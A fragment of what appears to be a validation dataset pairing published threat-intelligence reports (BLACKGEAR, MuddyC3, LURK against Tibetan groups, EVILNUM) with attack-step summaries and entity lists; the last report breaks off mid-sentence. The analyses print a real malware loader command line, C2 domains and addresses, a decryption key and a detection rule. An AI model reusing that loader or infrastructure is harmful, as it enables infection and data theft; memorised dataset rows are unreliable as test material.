Supplier DocumentsNews & Events Communication PreferencesTechnical Support Incident? Report Security Issue Documentation PortalCyber Threat MapCopyright © 2017 FireEye, Inc. All rights reserved.Privacy & Cookies Policy | Privacy Shield | Legal Documentation "," 1. A spearphishing email containing an RTF document exploiting CVE-2017-11882 is sent to victims. 2. The exploit triggers execution of malware that installs POWRUNER and BONDUPDATER. 3. POWRUNER beacons out to the C2 server to receive commands and exfiltrate data. 4. BONDUPDATER generates algorithmic subdomains for secondary C2 channels. 5. The malware can download more tools, take screenshots, and steal data from the victim system. ",valid_78,"['spear', 'CVE-2017-11882', 'The exploit', 'execution', 'POWRUNER', 'BONDUPDATER', 'the C2 server', 'commands', 'data', 'algorithm', 'subdomains', 'the malware', 'download']",spear; CVE-2017-11882; The exploit; execution; POWRUNER; BONDUPDATER; the C2 server; commands; data; algorithm; subdomains; the malware; download.
" BLACKGEAR is an espionage campaign which has targeted users in Taiwan for many years. Multiple papers and talks have been released covering this campaign, which used the ELIRKS backdoor when it was first discovered in 2012. It is known for taking using blogs and microblogging services to hide the location of its actual command-and-control (C&C) servers. This allows an attacker to change the C&C server used quickly by changing the information in these posts. Like most campaigns, BLACKGEAR has evolved over time. Our research indicates that it has started targeting Japanese users. Two things led us to this conclusion: first, the fake documents that are used as part of its infection routines are now in Japanese.  Secondly, it is now using blogging sites and microblogging services based in Japan for its C&C activity. This post will discuss this C&C routine, the tools used in these attacks, and the connections between these tools. Backdoors used by BLACKGEAR share a common characteristic: they all retrieve encrypted C&C configuration information from blogs or microblogs. An attacker would register an account on these services and then create posts. The encrypted C&C information would be between two hardcoded tags, as seen below: There are two reasons BLACKGEAR would use this technique. First, the beacon traffic of the backdoor would look like normal traffic to blogs. Secondly, the threat actor would be able to quickly change the C&C servers used if these were blocked. A defender would be unable to block this change in server from reaching any affected machines unless the legitimate site was blocked as well. The malware tools used by BLACKGEAR can be categorized into three categories: binders, downloaders and backdoors. Binders are delivered by attack vectors (such as phishing and watering hole attacks) onto a machine. These, in turn, drop decoys and downloaders. The latter connect to various sites under the control of the attacker and downloads backdoors. These use persistent methods to ensure that they remain present on the affected machines to give attackers access to the machine in question. By separating the attack tools into three stages, threat actors are able to adapt quickly. If one component is detected and/or blocked, it can be replaced without disrupting the entire toolset. Binder The binder (which we detect as the TROJ_BLAGFLDR family) hides as a normal folder by changing its icon to a folder icon. Once the victim executes it, it executes the downloader in the background, drops a decoy folder that includes fake documents, then delete itself. This is so the victim won’t notice that the malicious downloader has been executed. Downloader TSPY_RAMNY TSPY_RAMNY is a downloader dropped by TROJ_BLAGFLDR malware. To remain persistent, it moves itself to the Windows temp folder and drops a *.lnk (Windows Shortcut) file in the startup folder that points to itself. It also sends information about the compromised host (such as network settings) back to the download site. The download link is formatted in the following format:  http://{IP address}/{folder name}/{webpage name} (Example: http://{IP address}/multi/index.html) This is done so that if someone looks solely at the URL, the download of the backdoor will appear to be an ordinary website. TSPY_YMALRMINI TSPY_YMALRMINI is another downloader that is dropped by TROJ_BLAGFLDR malware, which also sends information about compromised hosts back to the download site. We were unable to determine which payloads were used by this downloader. However, our research indicates that some of these downloads are saved as drWaston.exe on the compromised host. This same file name is also used by some ELIRKS variants, indicating a possible connection. TSPY_YMALRMINI uses the same URL format as RAMNY. TSPY_YMALRMINI has the same download link pattern as TSPY_RAMNY. The family name for this malware is because some variants have the PDB string “C:\toolson-mini\YmailerCreater – Debug\Binder\Binder\YMailer.pdb”. In addition, these variants also create a log file named YmailerMini.log. BKDR_ELIRKS BKDR_ELIRKS was the first family of backdoors tied to BLACKGEAR. It retrieves encrypted C&C configuration information from various blogging or microblogging services. Once decoded, it connects to these C&C servers and waits for commands given by a threat actor. To remain persistent, it moves itself to the Windows temp folder and drops a *.lnk (Windows Shortcut) file in the startup folder that points to itself. Its backdoor routines include getting information from the compromised host, downloading and running files, taking screenshots, and opening a remote shell. BKDR_YMALR BKDR_YMALR is a backdoor written using the .NET framework which is also known as LOGEDRUT. The detection name comes from a log file created by this malware family named YMailer.log. Its behavior is similar to ELIRKS – both in terms of C&C information retrieval and available commands to a threat actor. Encryption and Decryption BKDR_ELIRKS Reverse analysis of ELIRKS allowed us to determine how to decrypt the C&C information, which is done in the following Python code: The malware contains shellcode with two things: the URL of the blog entry and the tags that identify where in the fake articles the hidden C&C information is located. Once the fake blog/microblog posts are downloaded, the malware finds and decrypts the C&C information. The C&C information is stored in the post in two short bits of text. The first is an eight-character string that is decoded into a six-byte hexadecimal value. The second is a two-character string which is already in a hexadecimal format, and is concatenated towards the end. A modified version of the TEA algorithm decrypts these into the C&C server locations. More than just tools being used together, it appears that there are distinct connections between the different tools used by BLACKGEAR. The string “YMailer” shows up in the filenames of log files used by both BKDR_YMALR and TSPY_YMALRMINI, and it is in the PDB strings of the latter. The two downloaders TSPY_RLMNY and TSPY_YMALRMINI both use the string toolson in different places. Lastly, both downloaders and one backdoor share the same decryption key 1q2w3e4r. The above illustration shows the connections between the families. Conclusion Malware threats need to evolve or otherwise become non-threats. Similarly, to stay relevant, BLACKGEAR has evolved with both new tools and new targets, and will continue to be a threat for the foreseeable future. We will continue to monitor its activities in order to protect our customers.",1. Binder malware (TROJ_BLAGFLDR) is delivered via phishing or watering hole attacks. 2. The binder executes a downloader malware (TSPY_RAMNY or TSPY_YMALRMINI) in the background. 3. The binder drops a decoy folder with fake documents and deletes itself to avoid detection. 4. The downloader sends system information back to the attacker's site. 5. The downloader connects to sites controlled by the attacker and downloads a backdoor (BKDR_ELIRKS or BKDR_YMALR). 6. The backdoor retrieves encrypted C2 instructions from blogs/microblogs. 7. The backdoor decrypts the C2 instructions to get the C2 server location. 8. The backdoor connects to the C2 server and can receive commands to: - Exfiltrate data - Take screenshots - Download and execute files - Open a remote shell 9. The backdoor remains persistent on the infected system to maintain access. ,valid_73,"['TROJ_BLAGFLDR', 'hole attacks', 'The binder', 'a downloader', 'TSPY_RAMNY', 'TSPY_YMALRMINI', 'the background', 'a decoy folder', 'fake documents', 'itself', 'detection', 'the downloader', 'information', 'the attacker', 'sites', 'a backdoor', 'BKDR_ELIRKS', 'the backdoor', 'microblogs', 'server', 'commands', 'screenshots', 'files', 'a remote shell', 'access']",TROJ_BLAGFLDR; hole attacks; The binder; a downloader; TSPY_RAMNY; TSPY_YMALRMINI; the background; a decoy folder; fake documents; itself; detection; the downloader; information; the attacker; sites; a backdoor; BKDR_ELIRKS; the backdoor; microblogs; server; commands; screenshots; files; a remote shell; access.
"7/2/2019⼼ti.qianxin.com/blog/articles/analysis-of-muddyc3-a-new-weapon-used-by-muddywaterBackground In early May of this year, hackers claimed in the Telegram channel (Channel: GreenLeakers) that they possess attack evidence and information regarding the MuddyWater APT group for sale.MuddyWater is widely regarded as a long-lived APT group in the Middle East. From February to April 2019, it launched a series of spear-phishing attacks against governments, educational institutions, ﬁnancial, telecommunications and defense companies in Turkey, Iran, Afghanistan, Iraq, Tajikistan and Azerbaijan.Image of the web control server:As well as its own inﬁltration tool, which is named as muddyc3 from the banner with version number 1.0.0.url⼼Yesterday (June 24) another telegram channel leaked the source code of muddyc3 and conducted related auctions.Later on, security researchers also posted related malicious samples and decompiled source code with the same version on Github url Analysis After acquiring related information, we found two samples named as muddyc3.exe.Decompile We found that one of the samples, with version v1.0.1, is generated by PyInstaller in x64 environment.We extracted the pyc and ﬁxed the magic information in the header to perform decompilation by Easy Python Decompiler and uncompyle6. Related build environment is Python 2.7 and we get the following decompiled ﬁles after removing related libraries:url⼼Code Analysis Versions 1.0.1 and 1.0.0 are only slightly different on the code level. The following picture shows the screenshot of the portal interface:url⼼First need to specify C&C server IP and port, and related proxy IP when needed.It supports four commands: list, show, use and payload. However, the show command does not have related processing logic in the code.It also lists some examples of the initial attack payload implementations. The initial script payload code can be embedded in a document as macro. When the target triggers the execution, it will access the C2 with the speciﬁed path.The main body of the tool is a server based script web.py, which is used to process request from client and provide response. URL paths for v1.0.0 and v1.0.1 are somewhat different.url⼼V1.0.0V1.0.1 It supports delivering the next stage payload such as sct, hta, and powershell, uploading, downloading, information collection, as well as supported modules.Since the packaged program does not contain the default Powershell payload code, we do not know what will be delivered in the next.Here we try to access the root path:As well as the /hta path:url⼼It performs simple character substitution and base64 encoding:Conclusion Considering the completeness of the decompiled control program, it should be an earlier version used by MuddyWater which could serve as a prototype for a post-inﬁltration framework.The RedDrip team of the QiAnXin Threat Intelligence Center will continue paying attention to the progress of relevant events. url multi-stage-backdoor-powerstats-v3-and-new-post-exploitation-tools/MUDDYWATER MUDDYC3url ","1. MuddyWater sends spear-phishing emails with document attachments containing malicious macros. 2. If the victim enables macros, the document reaches out to the MuddyC3 C2 server. 3. MuddyC3 allows the operator to deliver a next stage payload such as sct, hta, PowerShell. 4. The next stage payload further compromises the system and allows maintaining persistence. 5. MuddyC3 enables uploading and downloading files, collecting system info, and using modules. 6. The operator can leverage the compromised system for additional attacks, data exfiltration, etc. ",valid_48,"['MuddyWater', 'macro', 'muddyc3', 'sct', 'hta', 'powershell', 'the next stage payload', 'uploading', 'modules']",MuddyWater; macro; muddyc3; sct; hta; powershell; the next stage payload; uploading; modules.
"The Citizen LabResearch Brsecurelist.com /diceyf-deploys-gameplayerframework-in-online-casinoief Number 10 – July 2012Recent Observations in Tibet-Related Information Operations:Advanced Social Engineering for the Distribution of LURK MalwareKEY FINDINGS Social engineering techniques observed in recent targeted malware attacks against Tibetanorganizations appear to repurpose authentic, privately-held, sensitive content of Tibetan groups — in contrast to typical malware attacks that rely on simpler social engineering methods, such as referencing themes of interest to the organization or copying publicly available legitimate content. The use of this unique content suggests that attackers may have achieved a preliminary level of infiltration into Tibetan organizations, which could allow them to increase the apparent authenticity of subsequent attacks. These recent malware attacks have incorporated a “passwording” technique, whereby attached,infected Microsoft Office files are encrypted and can only be opened with a password provided in the domain, dtl.eatuo.com:63. Both dnsd.me and eatuo.com are dynamic DNS providers, and eatuo.com has the same domain registration information as the well-known Chinese provider 3322.net.1BACKGROUNDNumber 10 – July 2012This blog post is the third in a series documenting the use of information operations against Tibetans and others who advocate for Tibetan rights and freedoms.Previous research by the Citizen Lab has described information operations that leveraged the issue of self- immolations amongst Tibetans, as well as a recent European Parliament resolution on the human rights situation in Tibet.OVERVIEWIn its ongoing study of targeted cyber threats against civil society organizations, Citizen Lab has analyzed 11 malicious emails sent to Tibetan organizations between May and July 2012 that display noteworthy common elements, including malware that connects to the same command-and-control server.Attackers have targeted at least three separate organizations, sending the malicious emails to seven different email addresses associated with those three organizations.In each of these emails, the malicious file is password-protected, such that it can only be opened with a password provided in the email text (or in one case, in an image attached to the email), and the payload — LURK malware — is the same.The level of authenticity of the social engineering used in these emails, however, has increased over time, with the most recent emails repurposing sensitive content of Tibetan groups that was most likely privately held and/or inaccessible to the general public.The use of such content suggests that attackers may have achieved a preliminary level of infiltration into Tibetan organizations, which could allow them to accomplish more advanced and effective social engineering, thereby increasing the risk of compromise.TARGETED MALWARE ATTACKSIn the 11 emails there are four distinct messages used in the attacks, as outlined and illustrated below. The malicious attachments are all Microsoft Office documents — two Word documents and two Excel files — that are encrypted using four-digit numeric passwords, perhaps in an attempt to prevent detection of the malicious file by antivirus software, or to increase the apparent authenticity of the document.The passwords appear to have been chosen to reflect dates of historical significance with respect to Tibet — for example, 1959 was the year of the Tibetan uprising against the rule of the Communist Party of China, which is commemorated by the Tibetan community every year on March 10. The malicious payloads all ommunicate with the same command-and-control (C2) server (discussed further below).c2Number 10 – July 20121. “Droeshi”The first email, which was only sent to one email address of which we are aware, was sent on May 24, 2012 from what appears to be a compromised yahoo.com email account associated with a Tibetan required to open the attachment is 4155.1 The attachment is a Word document named Droeshi final.doc — when opened and supplied with the password, it crashes Word and drops its malicious payload (described in more detail below). No clean file is dropped or shown to the user, and there is no author or summary metadata.2. “Statement of the Kashag”The second email was sent on July 5 to at least two different organizations. The body of these emails contains only “PASSWORD: 0706.”2 The subject is “THE STATEMENT OF THE KASHAG ON THE SEVENTY-SEVENTH BIRTHDAY CELEBRATION OF HIS HOLINESS THE DALAI LAMA” and the “From” address spoofs the real address of a Tibetan organization. Although the emails to send each message differ: eabliz@gmx.com and hientr@gmx.com.This email also attached a single Word document, July6thFinal.doc, that exhibits similar behaviour to the Droeshi document but drops a slightly different malicious executable.3. “The concept notes”The third email came in two versions on July 17, differing only in an additional blank line in the email body and a typo in the subject line of one version. The social engineering has been significantly stepped up in this attack, though there are still numerous tell-tale signs that it is not legitimate. This email had five attachments: four benign .docx files, as well as a malicious Excel file named EIDHR_action_plan.xlsx.4Number 10 – July 2012Again there is no name in the salutation, but the email is signed in this case. The signature and “From” address used spoof a representative of the Office of Tibet.The Word documents attached to this email contain what appears to be an actual application by a Tibetan organization to the European Instrument for Democracy and Human Rights (EIDHR).The timing of this attack is particularly noteworthy in that a genuine EIDHR call for proposals — including for “Actions Aimed at Fighting Cyber-Censorship and to Promote Internet Access and Secure Digital Communication” — was pending at the time, with a July 20 deadline for concept notes.Such documentation related to grant proposals is typically of a sensitive and internal nature to civil society organizations, and inclusion of such content in a targeted malware attack is concerning, as it suggests access to confidential materials and perhaps even awareness of the parameters of the EIDHR call.Only the attached malicious Excel file requires the password — 19333 — to open, whereas the attached Word documents are not password protected. The malicious Excel file is actually an OLE file, not the newer Office Open XML format that the .xlsx extension suggests, and Excel refuses to open it unless the extension is changed to .xls. The dropped malicious executable is identical to the one from the “Statement of the Kashag” email.This file also drops a clean document, “set.xls,” in the user’s temporary folder and opens it in Excel. The contents of the file were unreadable on all computers we tried it on, displaying only question marks. However, the metadata of the file shows the author as ‘walkinnet’.5Number 10 – July 2012We saw five instances of this message, going to three different organizations. The email with the typo in the subject (“Tthe concept notes“) went to two different organizations, from a different IP send each message: c100tibet_board@gmx.com and ijoni_futbollisti@gmx.com.The other three instances of this email had the subject “The concept notes” and were sent by yet more unique gmx.com addresses: abarbour@gmx.com, jigme1@gmx.com and agnes9@gmx.com. The first two were sent from the same IP as used for the “Statement of the Kashag,” but the third came from different addresses. The email contains text and an Excel attachment that, as with the “The concept notes” email, suggest the attacker had access to confidential communications of a Tibetan organization.The spoofed “From” address, subject (“August visit of South African group”), and text of the email all appear to be repurposed from an authentic message sent to a Tibetan organization from a person seeking advice regarding an upcoming trip to Dharamsala, and the content includes in-depth details on trip logistics and planning.In this case, the password required to open the attached Excel file is not in the body of the email, but added (rather awkwardly) to an attached image of the logo of the organization belonging to the spoofed sender. The password is “1959,” the year of the aforementioned Tibetan uprising.The attached Excel file, Dharamsala August 2012 Full program.xls, is similar to the malicious attachment in “The concept notes” email, but it drops a different clean file. In this case the file is readable and contains what is almost certainly an authentic itinerary, which is referenced in the email. The clean file is also called set.xls, defaults to the same Chinese font, and has the same ‘walkinnet’ author metadata as the clean document in “The concept notes.”TECHNICAL ANALYSIS Within the dataset examined by Citizen Lab, two Word documents and two Excel documents were sent embedded with LURK malware, a remote access trojan that is a variant of Gh0stRAT. Note that the XLSX file is actually a standard .XLS file, not the new XML format. tactic makes it more difficult to identify embedded payloads and the vulnerability used.Number 10 – July 2012All of the files except for the first (Droeshi final.doc) have the same malware files embedded. The first uses a variant of the LURK trojan that is very similar, but not identical, to the others.Infection In each of the four cases, the document exploit drops the LURK trojan:%Temp%\iexplore.exe Two different versions of the trojan were seen between the four cases. While they all use the same filenames, n one case, the MD5 of the trojan is different: iJuly6thFinal.doc, EIDHR_action_plan.xlsx, Dharamsala August 2012 Full program.xls: %AppData%\Help\IconCacheEt.DAT %AppData%\Help\IconConfigEt.DAT %AppData\\Help\iexplore.exeAdditionally, the samples that use Excel as their vector also drop a clean file, opened after the malware executes:8%Temp%\set.xls For persistence, the trojan also creates the following link in the Startup folder, pointing at the iexplore.exe inary in %AppData%: bNumber 10 – July 2012C:\Documents and Settings\user\Start Menu\Programs\Startup\iexplore.lnkThe binary in %AppData% is only 9KB and acts as a launcher.IconConfigEt.DAT is the trojan’s configuration file, storing the C2 server addresses and ports, as well as a campaign name identifier. The file is mostly encrypted, with the campaign name stored in the clear. The configuration options are read from the main executable using GetPrivateProfileStringW(), a function for pre- registry configuration storage. This function is for backwards compatibility with pre-registry 16-bit Windows applications, and is not commonly used in modern applications.9Decryption of the configuration file is done in sub_4044B0() using a key generated in sub_404430() — the default is 0x11B29719, in the case of the more common version of the trojan the key is 0x11B297A9. Once the values have been read from the decrypted file, it is re-encrypted in sub_404560().Number 10 – July 2012Encrypted on disk (default):Decrypted:Once the configuration file is decrypted, the values are still not readable. Fortunately, the second layer decryption is an easy process — just decrement each character by 1.The values read from the configuration file are:1. Section [PPP], key P: Primary C2 server port number2. Section [WWW], key W: Primary C2 server name3. Section [PPP1], key P1: Secondary C2 server port number4. Section [WWW1], key W1: Secondary C2 server name5. Section [PPP2], key P2: Tertiary C2 server port number6. Section [WWW2], key W2: Tertiary C2 server name7. Section [MMM], key M: Campaign name10In the configuration files we have looked at for this run, the primary server is dtl.dnsd.me:63, and the secondary server is dtl.eatuo.com:63. Both dnsd.me and eatuo.com are dynamic DNS providers, and eatuo.com has the same domain registration information as the well-known Chinese provider 3322.org. No tertiary server is given.Number 10 – July 2012The malware checks in sub_4040E0() for a value of “Mark” in the registry at the following location:HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\DbxUpdateET\I	f a value is not found, it is set with the campaign name read from the configuration file key M.Campaign NamesThe four samples we received use three different campaign names, identified as follows in value 7 of each configuration file:Droeshi final.doc: campaign id TIBET July6thFinal.doc: campaign id T706 (note that the password on the file is also 0706, keeping on theme) EIDHR_action_plan.xlsx: campaign id T801 Dharamsala August 2012 Full program.xls: campaign id T801 The campaign names strongly suggest that these runs are specific to the Tibetan community, and that the Txxx attacks may be coming from the same source. The July6thFinal.doc, EIDHR_action_plan.xlsx, and Dharamsala August 2012 Full program.xls documents all drop the same trojan; the Droeshi final.doc trojan is slightly different (although uses much of the same code).Malware AnalysisThese samples match the behavior seen with other recorded instances of samples from this family in the wild. LURK is also known as Troj~Agent-XAT (Sophos), TROJ_MDROP.TPB and TROJ_MDROP.TPC (Trend Micro), and can also be picked up by more general antivirus detection such as Generic PWS.y (McAfee). In11the sample analyzed by Sophos, the campaign ID is “IE_0day” — not immediately related to attacks on the Tibetan community.Number 10 – July 2012Many more samples within this family exist with reports online — look for “DbxUpdateET” (where the campaign ID is stored in the registry) or the dropped files “IconCacheEt” and “IconConfigEt.” Another Tibetan-themed example using the dtl.eatuo.com domain was reported by ZenLab on March 26, 2012.The LURK malware is also referenced with a description of the communication protocol in Command Five’s paper “Command and Control in the Fifth Domain.” The network behavior we observed matches the described protocol.An additional file with the T801 campaign ID that we observed used twice was uploaded to ThreatExpert and can be found here.Command and Control InformationA port scan of the C2 server shows the following ports are open:PORT STATE SERVICE VERSION 21/tcp open tcpwrapped 53/tcp open domain? 80/tcp closed http 81/tcp open hosts2-ns? 135/tcp open msrpc Microsoft Windows RPC 1026/tcp open msrpc Microsoft Windows RPC 8080/tcp open http-proxy?In addition to port 63 (which is not shown as open in the above scan), ports 81 and 53 are both LURK.Network TrafficIn addition to the dropped files, infected machines can be found on a network by looking for the following found here):13alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:”APT LURK communication protocol detected”; flow:established,to_server; content:”|4C 55 52 4B 30|”; depth:5; reference:url,www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf; classtype:trojan-activity; sid:3000006; rev:1;)Number 10 – July 2012RECOMMENDATIONS Civil society organizations, particularly those working on issues related to Tibetan rights, shouldexercise caution with respect to any email containing a link or attachment. As the targeted malware attacks analyzed in this report demonstrate, content used to induce a recipient to open a malicious file may at one point have actually been authentic and private — and is that much more likely to appear legitimate. For tips on other ways to detect probable malware attacks and prevent compromise, see Citizen Lab’s Recommendations for Defending Against Targeted Cyber Threats. Civil society organizations should be wary of emails attaching password-protected documents andproviding said password in the email body. Such purported “security” measures are not an indicator of authenticity. Citizen Lab encourages civil society organizations and individuals working on human rights issues that have encountered these types of targeted malware attacks to contact us at hrthreats[AT]citizenlab.org. We appreciate submission of data, which will help strengthen our analysis of cyber threats.__________________FOOTNOTES 1 On April 1, 1955, the governments of India and China signed a protocol by which India handed over control of communications services in Tibet to China. See Protocol between the Governments of India and China Regarding the Handing Over of Postal, Telegraph and Public Telephone Services in the Tibet Region of China.142 The Fourteenth Dalai Lama Tenzin Gyatso was born on July 6, 1935. 3 The Thirteenth Dalai Lama Thupten Gyatso passed away on December 17, 1933.Number 10 – July 201215 "," 1. Socially engineered emails sent to Tibetan organizations containing password-protected Office documents. 2. Recipient opens document and enters password provided in email. 3. Document exploit drops LURK malware executable in temp folder. 4. LURK copies itself to startup folder for persistence and modifies registry. 5. LURK decrypts configuration file to retrieve C2 server info. 6. LURK contacts C2 server on port 63 for further commands. 7. C2 server can direct additional malware downloads, remote access, data exfiltration. ",valid_15,"['emails', 'Tibetan organizations', 'password', 'Office', 'Recipient', 'Document exploit', 'LURK malware', 'folder', 'Startup', 'persistence', 'registry', 'configuration file', 'C2 server', 'port', '63', 'Command', 'remote access', 'data']",emails; Tibetan organizations; password; Office; Recipient; Document exploit; LURK malware; folder; Startup; persistence; registry; configuration file; C2 server; port; 63; Command; remote access; data.
"7/10/2020Prevailion Blog: Phantom in the Command ShellPhantom in the Command Shellblog.prevailion.com/2020/05/phantom-in-command-shell5.htmlAuthor: Danny AdamitisExecutive SummaryPrevailion’s Tailored Intelligence Team has detected two new criminal campaigns targeting the global financial industry with the EVILNUM malware, one of which became active on May 3rd 2020. We have dubbed these new operations “Phantom in the [Command] Shell”.In these engagements, the attack begins when a victim is enticed into following a link to a file hosted on a well known, widely-used cloud provider - unaware that email filters are unlikely to block the domain, and the provider will trust their own links enough that a scan is unlikely. Once engaged, the victim’s device downloads a compressed folder that contains trojanized files. This is a user-initiated infection; meant to appear as a typical business interaction, in this case part of “Know Your Customer” banking procedures. These trojanized files use images of credit cards, driver’s licenses, passports, and utility bills. When the files are opened, the decoy images are displayed to the user, while an agent written in headless Javascript is surreptitiously invoked. Investigation of the agent reveals code comment indicating the two latest iterations are version 3.6 and 4.0, respectively. Both are designed for Windows OS.The first version of EVILNUM was identified in 2018; the second version was discovered in an unrelated incident response investigation a year later, having infiltrated a FINTECH company. The initial reporting on this malware was the only sign of its presence, as it briefly faded from view.EVILNUM has surfaced again in the financial sector with a new variant that has evolved with a very effective tool designed to evade both standard network- and host-based detection systems. It uses supplementary logic designed to help it adapt to the local system and alter its actions - and even the choice of C2 - based upon the antivirus products that are detected on the host machine. This agent allows the threat actor to upload files, download files, run commands, steal cookies and access other protected data. It is designed to persist through reboot by adding a registry key, and even removes artifacts of its presence from the host machine. Given the versatility added to this variant, we suspect that this agent has the capacity to load auxiliary payloads onto a host machine.Technical DetailsIntroductionPrevailion has discovered an updated variant of the deceptive EVILNUM agent. This agent was delivered to victims from a URL on a cloud- platform that hosts a zip file. If the link is clicked, the victim downloads a compressed folder riddled with trojanized files that masquerade as PDFs and JPEGs. These files display themselves as seemingly innocuous decoys to the end user, all while quietly running in the background. The first version of EVILNUM malware was observed and reported in 2018. The second version was reported by Palo Alto, targeting a specific financial technology (FinTech) organization. This report covers the latest versions 3.6 and 4.0, how they’re delivered, evasion techniques, and communications channels.Infection VectorThe infection chain begins when the victim receives a link to a Uniform Resource Locator (URL) hosted on a cloud-based platform, in this case GoogleDrive. This technique is increasingly used to avoid intrusion detection system (IDS) rules, by hosting the malicious file on a 3rd party platform that was likely whitelisted. When that link is clicked and traffic to GoogleDrive is initiated, it begins the process of downloading a compressed folder from that location.url Blog: Phantom in the Command ShellMicrosoft Link LuresPhantom in the command shell campaign walk throughPrevailion has thus far identified two compressed files harboring the subject malware, although there is evidence to suggest that more zip folders exist. Once decompressed, the folder is found to contain microsoft shortcut (lnk) files that were named to impersonate either jpeg or pdf files. We have categorized these lnk files into two subcategories. The first set of lures uses the basic Know Your Customer (KYC) elements as a ruse, these elements are files that anyone would be asked for when opening a new account with a finance services organization. Some examples include but are not limited to driver’s license, credit cards, credit history documents, and proof of address paperwork. The second subcluster includes a document that appears to impersonate an established financial services organization, and referenced their 2020 GDPR compliance plan. Given the nature of these lures, Prevailion suspects with moderate confidence these efforts were targeted towards select financial institutions rather than wide-scale spamming.Once decompress the first zip folders contained the following KYC files: ● Driv License front.jpg.lnk ● Driv License back.jpg.lnk ● Credit Card Front.jpg.lnk ● Credit Card Back.jpg.lnk ● Utility Bill.jpg.lnk.The name on the drivers license corresponds to a real person, who happens to be the CEO of a Bank located in a British territory. The address on the utility bill matches the city of the bank. The second compressed folder was very similar to the first, containing various KYC documents and impersonated a Canadian person who we suspect works for a different financial organization. The last KYC client file that we identified was a Finnish national that we suspect works for a managed cloud services provider. Prevailion was unable to confirm if these documents were authentic, however if forged they closely resemble the genuine article.The second subcategory contains a file name that references an organization rather than an individual. The document impersonates an investment company located in England. Like the previously mentioned lnk files, when clicked by the user it launches a script to run in the background of the computer.As we mentioned, there is added functionality built into this particular agent, and one element is in the display of a decoy file that corresponds to the selected file name. We analysed the properties of the lnk file themselves with lnk parser to search for clues left behind by the actor. However all the lnk files had the same forged metadata; the files were timestomped with a creation date of September 5th, 2018, from a VMWare device based upon the mac address, that had a NetBIOS name of “admin-pc”, suggesting they went to some lengths to obfuscate the metadata related to their activities. The lnk file properties can be found below.[Distributed Link Tracker Properties] Version: 0 NetBIOS name: admin-pc Droid volume identifier: a82e4430-d4a8-417a-b678-88e886bec590 Droid file identifier: 8cb9d0c4-b0f4-11e8-b065-005056c00008 Birth droid volume identifier: a82e4430-d4a8-417a-b678-88e886bec590 Birth droid file identifier: 8cb9d0c4-b0f4-11e8-b065-005056c00008 MAC address: 00:50:56:c0:00:08 UUID timestamp: 09/05/2018 (10:15:01.429) [UTC] UUID sequence number: 12389Loader FunctionalityOpening any one of the files, such as “Credit Card Front,” executes a protracted command line argument. The first operation moves the file to the Temp folder and renames it “1.lnk”. Then it proceeds to search for all the files that start with “Cred” in the Temp directory, and search recursively in all directories modified that day. Next it reads the 1.lnk file and redirects the output into a new file named 0.js, It then uses csript to executeurl Blog: Phantom in the Command Shellthat file. The command is as follows:""C:\Windows\System32\cmd.exe"" /c path=C:\Windows\system32&&move ""Credit Card front.jpg.lnk "" ""C:\Users\admin\AppData\Local\Temp\1.lnk""&forfiles /P ""C:\Users\admin\AppData\Local\Temp"" /M ""Cred*.lnk"" /S /D 0 /C ""C:\Windows\system32\cmd.exe /c move @path C:\Users\admin\AppData\Local\Temp\1.lnk""&type ""C:\Users\admin\AppData\Local\Temp\1.lnk""|find ""TRU4"">""C:\Users\admin\AppData\Local\Temp\0.js""|rd a||cSCripT ""C:\Users\admin\AppData\Local\Temp\0.js""Core AgentThis file, 0.js, is the main agent deployed to the victim’s machine. It's written in Phantom and this particular script was designed for Windows OS. One comment in the code suggested that this particular iteration was version 3.6. One of our favorite elements was the use of a one-way communication method to obtain the C2, in order to remain elusive. This agent also built in a function aptly named “DeleteLeftovers,” to remove certain artifacts of the attack.Once initiated the agent proceeds to enumerate the infected machine using Windows Management Instrumentation (WMI) to obtain the ● AntiVirus ProductsThis agent had traditional trojan functionality, that allowed it to perform the following tasks: ● Get Files, from the C2, ● Run arbitrary commands ● Run Windows Script Component (.sct) files ● Call a python 2.7 interpreter through rundll32 ● Log any errors that the agent generatedOne difference between this variant and previous iterations is the removal of the screenshot functionality. This agent did maintain some original functions such as: bringing files down from the C2, and converting strings of data into bytes and receiving binary data. This suggests the agent was capable of retrieving subsequent payloads, indicating it was likely just a first stage agent.Retrieval of C2 AddressOne of the first things the agent does is ping google to check for an internet connection. If the host machine is connected to the internet, the agent proceeds to kill any instances of Internet Explorer which have the command line parameter matching “-Embedding.” It then uses Internet Explorer to retrieve a remote web page that acts as a one-way communication method, that web page contains a string that identifies the corresponding C2 node.Like the previous variants of EVILNUM, the actor set up accounts on GitLab and Digital Point, a web forum. The four primary URLs used as drop sites for one-way communications were: ● hxxps://gitlab[.]com/jhondeer123/test/raw/master/README.md ● hxxps://www.digitalpoint[.]com/members/johndeer123.923670/ ● hxxps://gitlab[.]com/bliblobla123/testingtesting/-/raw/master/README.md ● hxxps://www.digitalpoint[.]com/members/bliblobla.943007/The actor likely set up two web pages that corresponded to each campaign for redundancy. The function would periodically check those two web pages every 180000 seconds (50 hours). Metadata properties of the most recent campaign show that the “bliblobla123” Gitlab account was created on May 3rd, 2020.url Blog: Phantom in the Command ShellImage showing the date when the Gitlab account was createdImage showing the latest C2 embedded in the README.MD fileThe “johndeer123” Digital Point account associated with version 3.6, was created on February 21, 2019. One of the differences in the 3.6 and 4.0 variants is that the agent obtains the IP address through a regex search for the string “8346758545”. On the Digital Point web forum instance the observed C2, hxxp://185.62.190[.]89, was stored as a value in the “interest” field.Image of Johndeer123 Digital Point ProfileIf the host is running BitDefender, EVILNUM will reach out to a different URL hxxps://gitlab.com/jhondeer123/test/raw/master/test.py. The agent then searches for the same string “8346758545”. There is also some fallback functionality to use “long2ip”, the arithmetic based method, implemented in the previous agent. This method takes the number then divides it by 8 and converts it to an IP address.Command and Control CommunicationsOnce the agent obtains the IP address it will send a GET request to check.php. If the IP address is indeed the correct C2, it returns a message padded with “jifhruhajsdfg444” on each side. In this case it received a padded “success” message:url Blog: Phantom in the Command ShellWireshark stream of a check interaction from the victim to the C2Once the agent confirms the correct IP address, it proceeds to send a register request. In this POST it sent the host based enumeration information. Once received the C2 responded with the agent’s unique identifier that will then get saved at appDataPath + \\Microsoft\\Credentials\\MediaPlayer\\MediaManager\\id.txt.Image of the register function with version 3.6 on the left and 4.0 on the rightBased upon code analysis the following HTTP requests and parameters were identified: ● “check.php?id=""+id + ""&ver=""+ ver Agent confirms it has the right IP address and sends version number ● “register.php?av="" + av + ""&cpu-name="" + cpuName + ""&ref=""+ 